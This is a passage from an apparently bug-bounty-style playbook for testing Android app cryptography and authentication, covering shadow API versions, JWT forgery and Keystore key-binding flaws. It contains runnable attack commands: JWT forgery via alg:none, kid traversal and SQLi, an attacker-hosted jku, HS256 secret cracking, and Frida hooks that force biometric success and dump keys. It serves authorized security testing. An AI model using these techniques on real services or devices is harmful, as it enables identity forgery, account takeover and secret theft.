grep -rn 'generatePublic\|X509EncodedKeySpec\|KeyFactory\.getInstance' out/sources/ -B10 | grep -inE 'payload|manifest|response|json|getString'
# the empty TrustManager cousin
grep -rn -A15 'checkServerTrusted\|checkClientTrusted\|X509TrustManager' out/sources/
grep -rn 'ALLOW_ALL_HOSTNAME_VERIFIER\|setHostnameVerifier\|HostnameVerifier' out/sources/
# order of operations: is the write/load before the verify?
grep -rn 'DexClassLoader\|PathClassLoader\|FileOutputStream\|Runtime\.getRuntime' out/sources/ -B20 | grep -n 'verify('
```
- **Proof:** The decompiled method body showing the discarded boolean (or the empty `checkServerTrusted`
  with a bare `return-void`), **plus** the app accepting an artefact you signed with your own key — a
  modified config, an unsigned update, a substituted model file — and acting on it.
- **Escalation:** → D17 (dynamic code loading / malicious update → code execution in the app's UID), D21
  (client integrity check defeated), D14 (if it is the TLS trust decision).
- **Ruled out when:** The verifier branches on the result, the public key is a compile-time constant or a
  pinned Keystore entry (not read from the payload), and the verification precedes any parse, write or
  load — demonstrated by serving a tampered artefact and observing a clean rejection with nothing written
  to disk.

### D12-043 · The shadow-API bridge: an older API version that does not enforce the signature at all

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | rate the weakened control: `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1), `broken_authentication_and_session_management.authentication_bypass` (P1), or `.two_fa_bypass` (P3) |
| **Attacker** | AM-01 |
| **Applies to** | any app whose hardcoded base URLs carry a version segment |
| **Maps to** | the shadow-API doctrine — a mobile app's hardcoded backend calls are frequently an **older** API version than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure |

- **Test:** The highest-value structural idea available to a mobile crypto reviewer. The app's request
  signing, payload encryption or nonce enforcement is implemented per API version. If the binary points at
  `/v1/` while the web app uses `/v3/`, the older version frequently predates the signing scheme entirely —
  and the crypto you just spent a day reversing may simply not be required there.
- **How:**
```bash
# 1) inventory every versioned path the binary knows about (DEX + native + bundle)
grep -rhoE 'https?://[a-z0-9.-]+/[a-z0-9/_-]*v[0-9]+[a-z0-9/_-]*' out/sources/ | sort -u
strings -a lib/*/*.so assets/index.android.bundle 2>/dev/null | grep -aoE '/v[0-9]+/[a-z0-9/_-]+' | sort -u
# 2) behavioural diff — same operation, each version, with and without the signing headers
for v in v1 v2 v3; do
  echo "== $v signed";   curl -s -o /tmp/$v.s -w '%{http_code} %{size_download}\n' \
    -H "Authorization: Bearer $T" -H 'X-Signature: <sig>' "https://api.target/$v/account/me"
  echo "== $v unsigned"; curl -s -o /tmp/$v.u -w '%{http_code} %{size_download}\n' \
    -H "Authorization: Bearer $T" "https://api.target/$v/account/me"
  diff /tmp/$v.s /tmp/$v.u > /dev/null && echo "  signature NOT enforced on $v"
done
# 3) field exposure diff
for v in v1 v3; do curl -s -H "Authorization: Bearer $T" "https://api.target/$v/account/me" | jq -r 'keys[]'; done
```
- **Proof:** The **behavioural** difference — the same operation succeeding on the older version without
  the signature, nonce or encryption the current version requires, with both response bodies in the report.
  A version difference alone is Informational; **the weakened control is the finding**.
- **Escalation:** → D15 (the whole older surface), D13 (if the older version's auth is weaker too), D23.
- **Ruled out when:** Every versioned path in the binary enforces the same signature, nonce and encryption
  requirements as the newest version — probed individually, with the unsigned response body differing from
  the signed one on each. Diff behaviourally, never by response shape.

### D12-044 · Hardcoded HS256 signing secret in the binary → forge arbitrary identities

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | HS256-signed sessions |
| **Maps to** | `hunt-jwt-crypto` (offline attacks), SSO-JWT forged-from-weak-secret class (hackerone.com/reports/638635) |

- **Test:** If the build ships the symmetric signing secret — or the secret is weak enough to recover
  offline from a captured token — every identity in the system is forgeable with no credential.
- **How:**
```bash
strings -a classes*.dex lib/*/*.so assets/* 2>/dev/null > strings_pkg.txt
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_pkg.txt | sort -u
grep -rniE 'jwtSecret|signingKey|HS256|SignatureAlgorithm\.HS|Jwts\.builder|io\.jsonwebtoken|Keys\.hmacShaKeyFor' out/sources/ -B6 -A6
# offline recovery from a captured token
hashcat -a 0 -m 16500 token.txt rockyou.txt
jwt_tool <token> -C -d wordlist.txt
```
- **Proof:** A token **you minted** (not issued by the server) accepted at an endpoint that returns data
  you cannot otherwise reach — with the account or tenant identifier in the response proving it is not
  yours.
- **Escalation:** → D13 (arbitrary identity), D15 (admin API), and per the chain-filing rule the secret
  extraction is filed first as its own primitive so the consumer report can reference its id.
- **Ruled out when:** No JWT in the package, or the algorithm is asymmetric and the app holds only the
  public key, or `hashcat -m 16500` over a large wordlist plus the DEX/native string corpus fails to
  recover the secret. Record the wordlist size and the runtime.

### D12-045 · RS256 → HS256 algorithm confusion using the public key as the HMAC secret

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | RS256-signed tokens with a reachable public key (a JWKS endpoint, or a PEM shipped in the app) |
| **Maps to** | `hunt-jwt-crypto` — algorithm confusion on a `v1` API (hackerone.com/reports/3800870, $1,337); `hunt-api-misconfig` §12 |

- **Test:** The verifier trusts the token's own `alg` header instead of pinning the algorithm server-side.
  The mobile-specific entry point is that the app often *ships* the RSA public key, which is exactly the
  HMAC secret you need.
- **How:**
```bash
# get the public key: from the app, or from the JWKS, or recover it from two captured tokens
grep -rn -- '-----BEGIN PUBLIC KEY' out/res/raw/* out/assets/* 2>/dev/null
curl -s https://api.target/.well-known/jwks.json | jq .
docker run -it --rm silentsignal/rsa_sign2n <token1> <token2>
jwt_tool <token> -X k -pk public.pem      # re-signs the edited payload as HS256 with the PEM as the secret
```
- **Proof:** The forged token authenticating as another identity at a protected endpoint, with that
  identity's data in the response.
- **Escalation:** Forge `role:"admin"` → admin listing → perform an admin action with the *same* token.
  That fixed three-step sequence is what converts a signature-bypass primitive into a Critical.
- **Ruled out when:** The verifier rejects a token whose `alg` is `HS256` when the key is RSA, with a
  distinct error body — tested with both the raw PEM and the DER as the HMAC key, and with and without the
  trailing newline. **Pre-severity gate:** a confirmed signature-bypass primitive at the audience layer is
  not a Critical if an issuer-trust check still rejects the token; that exact mistake produced a retracted
  `alg:none` Critical. Reproduce the full chain end-to-end twice before you write the word.

### D12-046 · `alg:none`, `kid`, `jku`/`x5u` and `jwk` header attacks on the app's own token

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | all JWT-based auth the app participates in |
| **Maps to** | `hunt-jwt-crypto`; `hunt-ato` Path 6(d); `hunt-api-misconfig` §12; missing/improper signature or claim validation (hackerone.com/reports/1760403; hackerone.com/reports/1040786, $10,000) |

- **Test:** Four header-level forgeries, all free to try against the token the app carries, plus the claim
  half.
- **How:**
```bash
# alg:none, including case variants — some verifiers reject "none" but accept "None"/"NONE"/"nOnE"
jwt_tool <token> -X a
# kid path traversal to a known-content file → the HMAC key becomes the empty string
#   header {"alg":"HS256","kid":"../../../../../../../dev/null"}, sign HS256 with ""
jwt_tool <token> -I -hc kid -hv "../../../../../../../dev/null" -S hs256 -p ""
#   kid can also carry SQLi / command injection / SSRF when the lookup hits a DB, shell or URL:
#   kid=' UNION SELECT 'secret --
# jku / x5u: host your own JWKS; if the host is allow-listed, chain an open redirect or SSRF on the
# target's own domain so the fetch resolves to your JWKS
jwt_tool <token> -X s -ju https://your-collab/jwks.json
# jwk: embed your own RSA public key in the header and sign with the matching private key
jwt_tool <token> -X i
# claims: drop exp entirely, or set nbf past / exp far future, and replay against internal services
#   {"nbf":1000000000,"exp":4102444800}
```
- **Proof:** A protected endpoint returning another identity's data with the forged or unsigned token. For
  the claim half, an expired or claim-tampered token honoured by at least one service — the common gap is
  **one internal microservice** that re-parses the JWT and assumes the gateway already validated it, so
  replay against secondary and internal endpoints, not just the one the app calls.
- **Escalation:** The `jku` variant pairs with any open redirect, which is otherwise on the never-submit
  list. Combine any of these with D12-044/D12-045 for full forgery.
- **Ruled out when:** Every variant above returns the same rejection body as a garbage token — tested with
  all four `none` cases, with and without the trailing dot, and against every host and version the binary
  references (D12-043), not just the primary one.

### D12-047 · An expired JWT in the binary is reconnaissance, not a dead end

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.sensitive_information_disclosed_jwt` (**P5** for the token itself) — file the *surface map* it yields, not the token |
| **Attacker** | AM-12 (recon) → AM-01 |
| **Applies to** | any APK shipping a token |
| **Maps to** | `apk-redteam-pipeline` Stage 3 + Anti-patterns ("Don't trust expired JWTs as dead intel") |

- **Test:** An eight-year-expired token is still intel. Its claim names tell you how to shape a forgery
  later; its `alg` tells you which attack applies; the paths around it inventory the internal API.
- **How:**
```bash
for t in $(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_pkg.txt | sort -u); do
  echo "$t" | cut -d. -f1 | base64 -d 2>/dev/null; echo
  echo "$t" | cut -d. -f2 | base64 -d 2>/dev/null; echo; echo ---
done
grep -rhoE '/v[0-9]+/[a-z0-9/_{}-]+' out/sources/ | sort -u > api_surface.txt
```
- **Proof:** A documented internal API surface map derived solely from the binary — claim names, the
  signing algorithm, and every versioned path the surrounding code references.
- **Escalation:** Endpoint inventory → D12-043 shadow-API version diff → D15 mass assignment. The impact
  framing that survives triage: "post-foothold, an attacker has the full API surface map without reversing
  the binary; HS256 secret recovery would yield arbitrary token forging."
- **Ruled out when:** No JWT or JWT-shaped string appears in the DEX, resources, native libraries or
  bundle. Do not file the token itself — `sensitive_information_disclosed_jwt` is P5.

### D12-048 · `setUserAuthenticationRequired` absent on a key that gates a sensitive action

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies, CWE-325); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) when it yields the session |
| **Attacker** | AM-11 physical unlocked / AM-08 malicious SDK / AM-03 with any in-process execution primitive |
| **Applies to** | API 23+ (`KeyGenParameterSpec`); `setUserAuthenticationParameters` is API 30+ and supersedes `setUserAuthenticationValidityDurationSeconds` |
| **Maps to** | MASWE-0016 (Cryptographic Key Access Not Restricted, CWE-284/306 — "Assuming Hardware Implies Restriction" is called out explicitly), MASWE-0020, MASTG-TEST-0330, MASTG-TEST-0018, MASTG-KNOW-0043; AOSP keystore tags `TAG_NO_AUTH_REQUIRED`, `TAG_AUTH_TIMEOUT`, `TAG_USER_AUTH_TYPE`, `TAG_USER_SECURE_ID` |

- **Test:** Hardware backing protects **extraction**, not **use**. A key with no auth requirement is usable
  by anything running in the app's UID. The app shows `BiometricPrompt`, then decrypts with a key that was
  never bound to the authentication — the prompt is decoration.
- **How:**
```bash
grep -rn -A25 'KeyGenParameterSpec\$Builder\|KeyGenParameterSpec\.Builder' out/sources/ \
  | grep -nE 'setUserAuthenticationRequired|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds'
grep -rn 'BiometricPrompt\|onAuthenticationSucceeded\|CryptoObject' out/sources/
```
  Confirm with the `userAuthRequired` column from the D12-004 table, then call the app's own decrypt path
  directly with no prompt shown:
```javascript
Java.perform(function () {
  var C = Java.use('com.target.app.crypto.CryptoManager');
  var P = Java.use('com.target.app.storage.Prefs');
  console.log('[PLAINTEXT] ' + C.$new().decrypt(P.$new().getEncryptedToken()));
});
```
  And the decorative-biometric check — if forcing the success callback releases the secret, the key was
  never bound:
```javascript
Java.perform(function () {
  var CB = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
  CB.onAuthenticationSucceeded.implementation = function (r) {
    console.log('[*] forced success; CryptoObject=' + r.getCryptoObject());
    return this.onAuthenticationSucceeded(r); };
});
```
- **Proof:** The pair, not either half: `r.getCryptoObject()` printing **`null`** (no key bound to the
  authentication) **and** the app subsequently releasing the protected secret — ideally with the decrypted
  token then accepted by the server. The decisive negative observable is the **absence** of
  `UserNotAuthenticatedException` from `Cipher.doFinal`.
- **Escalation:** → D13 (account takeover), D23 (transaction signing). Empirical anchors: Shopify's
  "Bypass of biometrics security functionality" paid $500 (#637194, Low); Samsung rates "Unauthorized
  Access to Data protected by TEE" as High.
- **Ruled out when:** The D12-004 table shows `userAuthRequired=true` **and**
  `authHWEnforced=true` for the alias, and the direct Frida call into the decrypt path throws
  `UserNotAuthenticatedException`. **Demotion warning:** if your only PoC is a Frida hook on a rooted
  device with no `CryptoObject` argument, triage will call it "root detection bypass" and close it — you
  must show the *absence of key binding*, not the presence of Frida. Samsung's ineligible list is explicit:
  "scenarios that can be mitigated if secure lock … authentication is enforced", so show the *enforced*
  case failing.

### D12-049 · Time-window auth presented as per-operation auth — the keyguard-asserted differential

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); rate on the operation's value |
| **Attacker** | AM-11 / AM-08 |
| **Applies to** | API 23+; the two-argument `setUserAuthenticationParameters(duration, authType)` is API 30+ |
| **Maps to** | `developer.android.com/privacy-and-security/keystore` — duration-based ("key authorized for a time period after authentication") versus per-operation ("each cryptographic operation requires individual user authorization via `BiometricPrompt.authenticate()`"); MASWE-0023 (Step-Up Authentication Not Implemented for Sensitive Actions); AOSP `TAG_AUTH_TIMEOUT` |

- **Test:** A non-zero duration means the key is usable by *anything* in the UID for that window after any
  qualifying unlock — including a background operation the user never saw. `0` is auth-per-use and is the
  correct value for a high-value action. Apps that describe a duration window as "you must authenticate
  each time" are over-claiming.
- **How:**
```bash
grep -rnA3 'setUserAuthenticationParameters\|setUserAuthenticationValidityDurationSeconds' out/sources/
```
  Read `authTimeout` from the D12-004 table, then run the differential **asserting keyguard state at every
  beat** — a first attempt at this without the assertion produced *inverted* results:
```bash
assert_kg () { adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'; }
adb shell locksettings set-pin 1234
# beat 1: verified credential unlock, then sign immediately
adb shell input keyevent 26; adb shell input keyevent 82; adb shell input text 1234; adb shell input keyevent 66
assert_kg                                   # expect isKeyguardShowing=false
adb shell am start -n com.target.app/.SignActivity --es op sign
# beat 2: wait past the window with NO interaction, then sign again
sleep 75; assert_kg
adb shell am start -n com.target.app/.SignActivity --es op sign
adb logcat -d | grep -iE 'UserNotAuthenticated|KeyPermanentlyInvalidated|signed'
```
- **Proof:** A clean differential in one take: sign immediately after a verified unlock → **signed, no
  prompt**; sign +75 s later with no interaction → **Keystore refused, exception text captured** — with the
  keyguard state printed before each beat. If the second beat also signs, the window is longer than
  advertised and that is the finding.
- **Escalation:** → D13 (the biometric gate grants more authority than the UI represents); a 300-second
  window on a payment-signing key is High on its own.
- **Ruled out when:** `authTimeout == 0` (auth-per-use) on every key that gates a sensitive action, and the
  second beat refuses. **A positive without its negative control is not evidence — and a muddled negative
  control is worse than none, because it will be reported as a result.**

### D12-050 · `setInvalidatedByBiometricEnrollment(false)` — enrol your own finger

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-11 physical unlocked (a borrowed, shared or stolen-while-unlocked device) |
| **Applies to** | **API 24+** |
| **Maps to** | MASWE-0022 (Crypto Keys Not Invalidated on New Biometric Enrollment); `developer.android.com/identity/sign-in/biometric-auth` ("ensures the key becomes unusable if the user enrols new biometric credentials"); `privacy-and-security/keystore` ("By default, keys supporting only biometric credentials are invalidated when new biometrics are enrolled") |

- **Test:** The default invalidates a biometric-bound key on new enrolment. Setting it `false` means an
  attacker with brief access to an unlocked device can enrol **their own** fingerprint or face and then use
  the victim's key indefinitely. Coerced-unlock and evil-maid scenarios collapse into "add a finger".
- **How:**
```bash
grep -rn 'setInvalidatedByBiometricEnrollment' out/sources/ -B4 -A4
```
```bash
# empirical: authenticate, enrol a second biometric, retry
adb shell am start -a android.settings.SECURITY_SETTINGS      # enrol a NEW biometric
adb shell am force-stop com.target.app
adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1
adb logcat -c; adb logcat | grep -i 'KeyPermanentlyInvalidated\|InvalidKey'
```
- **Proof:** After enrolling a new biometric, the app still decrypts or signs successfully — **no
  `KeyPermanentlyInvalidatedException`** — demonstrated with the newly enrolled biometric, on video, with
  the enrolment step in frame.
- **Escalation:** → D13 (durable account access on a shared or briefly borrowed device); it converts
  temporary physical access into permanent access to the protected secret.
- **Ruled out when:** The flag is absent (the secure default) or explicitly `true`, **and** the empirical
  test produces `KeyPermanentlyInvalidatedException` with the app forcing re-enrolment. **This test needs a
  physical device with a real sensor** — an emulator's synthetic fingerprint enrolment is not authoritative
  for the invalidation path; say which you used.

### D12-051 · `setUnlockedDeviceRequired` absent on a key used only in the foreground

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); rate on what the operation does |
| **Attacker** | AM-10 physical locked |
| **Applies to** | **Android 9 (API 28)+** |
| **Maps to** | `developer.android.com/privacy-and-security/keystore` — `setUnlockedDeviceRequired`: "Key can only be used when the device is unlocked (if supported by secure hardware)"; AOSP `TAG_UNLOCKED_DEVICE_REQUIRED` |

- **Test:** Without it, the key remains usable while the device is locked — so a background service, an
  exported entry point, a push handler or a locked-device execution primitive can use it.
- **How:**
```bash
grep -rn 'setUnlockedDeviceRequired' out/sources/ -B6 -A6
```
  Read `unlockedDeviceRequired` from the D12-004 table, then:
```bash
adb shell input keyevent 26                                  # lock the screen
adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'    # assert locked
adb shell am broadcast -a com.target.app.SYNC -n com.target.app/.SyncReceiver
adb shell am startservice -n com.target.app/.BackgroundSignService
adb logcat -d | grep -iE 'decrypt|sign|UserNotAuthenticated'
```
- **Proof:** The protected operation completing while the screen is locked — screen recording plus the
  operation's server-side effect or the logcat line, with the keyguard state asserted in the same take.
- **Escalation:** → D05/D06 (which exported component gives you the trigger), D23 (money-moving while
  locked).
- **Ruled out when:** `unlockedDeviceRequired=true` on every key that performs a sensitive operation
  **and** the locked-device trigger returns an exception rather than a result. Note that this property is
  only enforced "if supported by secure hardware" — verify on a physical device, not an AVD.

### D12-052 · Smart Lock and trusted places — `setUnlockedDeviceRequired` is not "user present"

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) |
| **Attacker** | AM-11 (an attacker in the trusted place, or carrying a spoofed trusted Bluetooth address) |
| **Applies to** | Android 5+ (trust agents); OEMs ship different agents — record which one you used |
| **Maps to** | `KeyguardManager.isDeviceLocked` javadoc, verbatim: the device is considered unlocked when it is "kept unlocked by being near a trusted bluetooth device or in a trusted location" |

- **Test:** `setUnlockedDeviceRequired(true)` asserts only that the device is *not locked*. With Smart Lock
  extend-unlock — trusted place, trusted Bluetooth device, on-body detection — a phone sitting on a desk at
  the victim's home, or paired to their car, is logically unlocked while nobody is holding it. The control
  the developer chose does not mean what they think it means, and that framing is how this survives triage.
- **How:**
```bash
adb shell dumpsys trust
adb shell dumpsys lock_settings | grep -iE 'trust|agent'
grep -rn 'setUnlockedDeviceRequired' out/sources/ -B6 -A6     # which key, used for what?
```
  Configure a trusted Bluetooth device on the test phone, pair it, move the phone away from the user, and
  use the key-backed feature with no authentication.
- **Proof:** `dumpsys trust` showing `trusted=true` / `trustGranted` with the screen not unlocked by the
  user, plus the app performing the key-backed operation.
- **Escalation:** Pairs with D12-053 — together they cover the two device states in which the standard
  Keystore recommendations silently do nothing.
- **Ruled out when:** The key also carries `setUserAuthenticationRequired(true)` with `authTimeout=0`, so
  device-unlocked state is insufficient and a fresh per-operation authentication is required regardless of
  trust agents.

### D12-053 · The no-secure-lock device — the auth-bound key silently becomes an unprotected key

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-10/AM-11 — and this is exactly the device a thief has |
| **Applies to** | all |
| **Maps to** | `frameworks/base` `KeyguardManager.isDeviceSecure` javadoc — returns true "if the `Context`'s user has a secure lock screen"; `isDeviceLocked` considers the device "unlocked" when "the lock screen is dismissible with swipe" |

- **Test:** A key with `setUserAuthenticationRequired(true)` **cannot be generated** on a device with no
  PIN, pattern or password. Implementations commonly catch that exception and fall back to an unprotected
  key, or skip the gate entirely — and `BiometricPrompt` with `DEVICE_CREDENTIAL` on such a device has
  nothing to prompt for. Almost nobody tests this device state.
- **How:**
```bash
# a device/emulator with NO screen lock at all
adb shell locksettings clear --old 1234
adb shell locksettings get-disabled
adb shell settings get secure lockscreen.disabled
# relaunch and reach the "protected" feature
adb shell pm clear com.target.app; adb shell monkey -p com.target.app 1
```
```javascript
Java.perform(function () {
  var K  = Java.use('android.security.keystore.KeyGenParameterSpec$Builder');
  K.setUserAuthenticationRequired.implementation = function (b) {
    console.log('authReq=' + b); return this.setUserAuthenticationRequired(b); };
  var KM = Java.use('android.app.KeyguardManager');
  KM.isDeviceSecure.overload().implementation = function () {
    var r = this.isDeviceSecure(); console.log('isDeviceSecure=' + r); return r; };
  var BP = Java.use('androidx.biometric.BiometricPrompt');
  BP.authenticate.overloads.forEach(function (o) {
    o.implementation = function () { console.log('authenticate() called'); return o.apply(this, arguments); }; });
});
```
- **Proof:** Console showing `isDeviceSecure=false` together with either `authReq=false` on the generated
  key, or the protected screen rendering while `authenticate()` is never called — plus a screenshot of the
  unlocked app beside Settings > Security showing "None".
- **Escalation:** → D13 (session reachable without auth) → D23 (payment without auth). Also run the
  intermediate case: a **swipe-only** lock, which is visually "locked" but reports `isDeviceLocked()` false.
- **Ruled out when:** On a no-lock device the app refuses the protected feature outright with a message
  telling the user to set a screen lock, and the Frida trace shows the key generation failing rather than
  falling back. **Do not confuse this with D12-078:** key generation *failing* on your lockscreen-less test
  emulator is a harness problem; the finding is the app's *fallback* when it fails.

### D12-054 · StrongBox requested, software fallback taken silently

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_space` (P3) is the nearest crypto-native slot; realistically this is an assurance/claim-accuracy finding rated by what the claim gates |
| **Attacker** | AM-11 with a device that lacks StrongBox |
| **Applies to** | **Android 9 (API 28)+**; StrongBox optional from Android 10 for device-unique attestation |
| **Maps to** | `developer.android.com/privacy-and-security/keystore` — check `PackageManager.FEATURE_STRONGBOX_KEYSTORE` first; `setIsStrongBoxBacked(true)` "throws `StrongBoxUnavailableException` if the algorithm/key size isn't supported"; StrongBox properties (own CPU, secure storage, TRNG, tamper resistance, secure timer) and supported algorithms (RSA 2048, AES 128/256, ECDSA/ECDH P-256, HMAC-SHA256, Triple DES); AOSP security-model §4.3.8 (StrongBox as TRH, first shipped on Pixel 3 / Titan M) |

- **Test:** Read the `catch` block. Apps commonly fall back to a *software* key while the UI continues to
  claim hardware protection.
- **How:**
```bash
grep -rn -A12 'setIsStrongBoxBacked' out/sources/ | grep -nE 'StrongBoxUnavailableException|catch|setIsStrongBoxBacked\(false\)|fallback'
grep -rn 'FEATURE_STRONGBOX_KEYSTORE\|hasSystemFeature' out/sources/
adb shell pm list features | grep -i strongbox     # expect ABSENT on a stock AVD and on most non-flagships
```
- **Proof:** On a device without `android.hardware.strongbox_keystore`, the app completing setup and
  displaying a hardware-security assurance while `KeyInfo.getSecurityLevel()` reports a software level —
  screenshot the claim beside the measurement.
- **Escalation:** The fallback downgrades the whole key hierarchy to software, which makes D12-056 and
  D12-013 live again.
- **Ruled out when:** The app probes `FEATURE_STRONGBOX_KEYSTORE` first, and on a device without it either
  degrades the *feature* (not just the key) or surfaces the reduced assurance to the user. **Do not report
  the absence of StrongBox on an emulator** — see D12-077.

### D12-055 · `KeyStoreException` / `ProviderException` catch-all → permanent software downgrade

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); exit via the extractable key it creates |
| **Attacker** | AM-03/AM-08 after the downgrade; AM-12 to induce it |
| **Applies to** | **Android 13 (API 33)+** for the structured error hierarchy; the anti-pattern predates it |
| **Maps to** | `developer.android.com/about/versions/13/features` — Keystore/KeyMint error hierarchy under `java.security.ProviderException`, with `KeyStoreException` carrying error codes that "indicate whether errors are retryable" |

- **Test:** `catch (Exception e) { useSoftwareFallback(); }` around key generation means a **transient**
  KeyMint error permanently downgrades the app to a non-hardware-backed, extractable key — and the app
  never recovers, because the fallback key is now the persisted one.
- **How:**
```bash
grep -rn 'KeyGenParameterSpec\|KeyGenerator\.getInstance\|generateKey\(' out/sources/ -A12 \
  | grep -nE 'catch *\(|ProviderException|KeyStoreException|fallback|software|SecretKeySpec'
```
  Induce the failure once and watch what the app persists:
```javascript
Java.perform(function () {
  var KG = Java.use('javax.crypto.KeyGenerator'); var once = true;
  KG.generateKey.implementation = function () {
    if (once) { once = false;
      throw Java.use('java.security.ProviderException').$new('induced transient KeyMint failure'); }
    return this.generateKey(); };
});
```
```bash
adb shell run-as com.target.app sh -c 'grep -rEl "[A-Za-z0-9+/]{32,}={0,2}" shared_prefs/ files/'
```
- **Proof:** After a single induced failure, a raw key appears in `shared_prefs` or `files` (or the
  D12-004 alias disappears) and the app keeps using it across restarts.
- **Escalation:** → D11 (the key is now extractable) → D13.
- **Ruled out when:** The catch inspects `KeyStoreException.isTransientFailure()` (or the error code) and
  retries rather than downgrading, and the induced-failure test leaves no raw key on disk and the
  Keystore alias intact.

### D12-056 · The key also exists as a `byte[]` in-process — there is no hardware guarantee at all

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the bytes are a constant; otherwise rate on the claim it invalidates |
| **Attacker** | AM-08/AM-03 with in-process code execution; AM-01 if the material is constant |
| **Applies to** | all |
| **Maps to** | AOSP "Hardware-backed Keystore" — the AndroidKeyStore API runs "in the app's own process space", the keystore daemon holds only encrypted keyblobs, and the KeyMint TA "in a secure context, most often in TrustZone" holds the raw key material; AOSP security-model §4.3.8: "even with a fully compromised kernel, an attacker cannot read key material stored in Keymint" — a claim that only holds for keys actually in KeyMint |

- **Test:** A key visible in a `SecretKeySpec`/`Cipher.init` hook is by definition extractable — it never
  lived in hardware. An app that generates keys with `KeyGenParameterSpec` *and* keeps a copy in a
  `byte[]`, or derives keys in-process from a constant, has no hardware guarantee whatever the marketing
  says.
- **How:** Run the D12-002 hook and then the runtime triage that settles it in one line:
```javascript
Java.perform(function () {
  var KS = Java.use('java.security.KeyStore'); var ks = KS.getInstance('AndroidKeyStore'); ks.load(null);
  var it = ks.aliases();
  while (it.hasMoreElements()) { var a = it.nextElement(); var k = ks.getKey(a, null);
    var enc = k.getEncoded();
    console.log(a + ' getEncoded() -> ' + (enc === null ? 'null (TEE-backed)' : enc.length + ' BYTES — SOFTWARE/EXPORTABLE')); }
});
```
- **Proof:** Raw key bytes printing from `getEncoded()` or from the `SecretKeySpec` hook, set beside the
  vendor's stated control ("keys never leave the device", "hardware-backed"). A genuinely Keystore-backed
  key yields an opaque handle, not bytes.
- **Escalation:** → D11 (offline decryption of everything the key protects), D15 (forge signed requests).
  High when the vendor's threat model or marketing asserts hardware key protection, because the finding
  invalidates a stated control; Critical when the bytes are a constant in the APK.
- **Ruled out when:** `getEncoded()` returns `null` for every alias, no `SecretKeySpec` constructions occur
  on the sensitive path under the hook, and the D12-004 table shows hardware-enforced properties on a
  physical device.

### D12-057 · `setRandomizedEncryptionRequired(false)` — the caller supplies the IV on a Keystore key

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_initialization_vector` (P4); `.initialization_vector_reuse` (P5) |
| **Attacker** | AM-03/AM-08 |
| **Applies to** | API 23+ |
| **Maps to** | MASWE-0007; the `randomizedEnc` column of the D12-004 `KeyInfo` read |

- **Test:** By default a Keystore key requires randomised encryption — the system generates the IV and the
  caller cannot choose it. Setting this `false` hands IV selection back to app code, which is exactly where
  D12-019 and D12-020 come from, and it is invisible to a grep for `IvParameterSpec` alone.
- **How:**
```bash
grep -rn 'setRandomizedEncryptionRequired' out/sources/ -B6 -A6
```
  Read `randomizedEnc` from the D12-004 table for every alias, and correlate with the `[IV]` hook output
  from D12-002 to see whether the IV that reaches the cipher is app-chosen and constant.
- **Proof:** `randomizedEnc=false` on the alias **plus** the same IV printed across separate encryptions
  under that alias.
- **Escalation:** → D12-019/D12-020 (the IV finding this enables), → D12-017 (malleability).
- **Ruled out when:** Every alias reports `randomizedEnc=true`, or the flag is false only on a key whose
  mode is GCM with a `SecureRandom` nonce generated fresh per operation and never repeated across the
  corpus.

### D12-058 · Keystore used as a decryption or signing oracle by an exported surface

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) or `sensitive_data_exposure.disclosure_of_secrets.*` |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | all |
| **Maps to** | AOSP security-model §4.3.8, verbatim: "only storing and using keys in TEE or TRH does not completely solve the problem … if an attacker gains access to the low-level interfaces for communicating directly with Keymint or Strongbox, they can use it as an oracle for cryptographic operations that require the private key. This is the reason why keys can be authentication bound and/or require user presence verification." |

